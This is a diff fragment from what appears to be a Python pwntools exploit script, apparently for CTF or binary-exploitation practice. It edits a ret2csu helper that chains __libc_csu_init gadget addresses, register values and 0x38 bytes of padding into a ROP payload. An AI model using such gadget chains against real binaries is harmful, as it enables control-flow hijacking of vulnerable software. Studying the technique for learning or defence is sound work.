@@ -1321,7 +1321,7 @@ def csu(rbx, rbp, r12, r13, r14, r15, last):
     # rdi=edi=r12d
     # rsi=r13
     # rdx=r14
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
     payload += p64(csu_front_addr)
     payload += b'a' * 0x38 #这个是固定的
     payload += p64(last)
